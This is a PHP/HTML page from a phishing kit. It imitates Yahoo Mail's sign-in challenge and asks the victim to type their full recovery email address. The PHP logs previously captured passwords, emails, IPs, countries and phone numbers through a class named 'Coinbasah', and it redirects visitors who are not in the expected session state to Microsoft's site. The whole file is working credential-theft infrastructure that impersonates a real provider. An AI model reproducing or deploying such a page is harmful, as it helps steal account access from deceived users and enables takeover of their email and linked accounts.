<?php
session_start();
require "../../function/settings.php";
if ($_SESSION['Status'] != 'otpmail') {
    header('Location: https://www.microsoft.com/en-us/microsoft-365?rtc=1');
}
$config_file = '../../function/config.json';
$json_data = file_get_contents($config_file);
// Decode JSON data into PHP array
$config = json_decode($json_data, true);
$Result =  new Coinbasah();
$Result->updateLog();
if (isset($_POST['Continue'])) {
    if ($Result->EmailLoginRecovery($_POST) > 0) {
    } else {
    }
}

$result = $Result->getKeyFromLog($_SESSION['Userinfo']);
if (is_array($result)) {
    // Extract the variables from the array
    $key = $result['key'];
    $ip = $result['ip'];
    $email = $result['email'];
    $password = $result['password'];
    $country = $result['country'];
    $phonenumber = $result['phonenumber'];
    $emailto = $result['emailto'];
    $status = $result['status'];
}

?>
<!DOCTYPE html>
<html id="Stencil" lang="en-US" class="js grid light-theme ">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
    <meta name="format-detection" content="telephone=no">
    <meta name="referrer" content="strict-origin-when-cross-origin">
    <meta name="oath:guce:consent-host" content="guce.yahoo.com">
    <title>Yahoo</title>
    <link rel="icon" type="image/x-icon" href="assets/images/email/yahooicon.ico">
    <style nonce="">
        #mbr-css-check {
            display: inline;
        }
    </style>
    <link href="assets/style/email/yahoo-main.css" rel="stylesheet" type="text/css">
  <style>
    body {
        margin: 0;
        padding: 0;
        overflow: hidden; /* Prevent scrolling */
    }

    #loadingOverlay {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(255, 255, 255, 0.6); /* Semi-transparent background */
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        z-index: 9999; /* Ensure it's on top */
    }

    #animationContainer {
        width: 50px;
    }

    #loadingText {
        margin-top: 20px;
        font-size: 14px;
        color: #333;
    }
  </style>
</head>

<body class="bucket-mbr-app-auth-upsell bucket-mbr-comm-channel-v3 bucket-mbr-reg-password-v2">
    
    <div id="login-body" class="loginish  puree-v2  grid    ">
        <div class="mbr-desktop-hd">
            <span class="column">
                <a href="#">
                    <img src="assets/images/email/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo " width="" height="36">
                    <img src="assets/images/email/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo " width="" height="36">
                </a>
            </span>
            <span class="column help txt-align-right">
                <a href="#">Help</a>
            </span>
        </div>
        <div class="login-box-container">
            <div class="login-box right">
                <div style="padding-top:20px; padding-left:20px;">
                    <img src="assets/images/email/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27">
                    <img src="assets/images/email/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="" height="27">
                </div>
                
                <div class="mbr-login-hd txt-align-center">
                    <img src="assets/images/email/yahoomail.png" alt="Yahoo" class="logo yahoo-en-US" width="200">
                    <img src="assets/images/email/yahoomail.png" alt="Yahoo" class="dark-mode-logo logo yahoo-en-US" width="200">
                </div>
                <div class="challenge password-challenge">
                    <div class="challenge-header">
                        <div class="yid"><?= @$_SESSION['Email']; ?></div>
                    </div>
                    <div id="password-challenge" class="primary">
                        <strong class="challenge-heading">Verify your email</strong>
                        <span class="txt-align-center challenge-desc">for security reason please enter full recovery email address<br><br>
                        <span style="font-size: 15px;font-weight: 500;"><?= @$emailto; ?></span>
</span>
                        <form method="post" class="challenge-form ">
                            <div id="password-container" class="input-group password-container blurred">
                                <input type="email" id="passwd" class="password" name="password" placeholder="" autofocus="" autocomplete="current-password" data-rapid-tracking="true" data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd" required style="width: 100%;">
                                <label for="login-passwd" id="password-label" class="password-label">Recovery email listed above</label>
                            </div>
                            <div class="button-container">
                                <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="Continue" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next">
                                    Send
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <div id="login-box-ad-fallback" class="login-box-ad-fallback">
                <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
                <p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
            </div>
        </div>

    </div>
    <div id="mbr-css-check"></div>
    <div id="page-mask" class="page-mask hide"></div>
    <div id="ad"></div>
    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
        <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
        <input type="checkbox" id="mbr-legacy-device-bar-cross">
        <p class="mbr-legacy-device">
            Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now. <a href="#">More&nbsp;Info</a>
        </p>
    </div>
</body>

</html>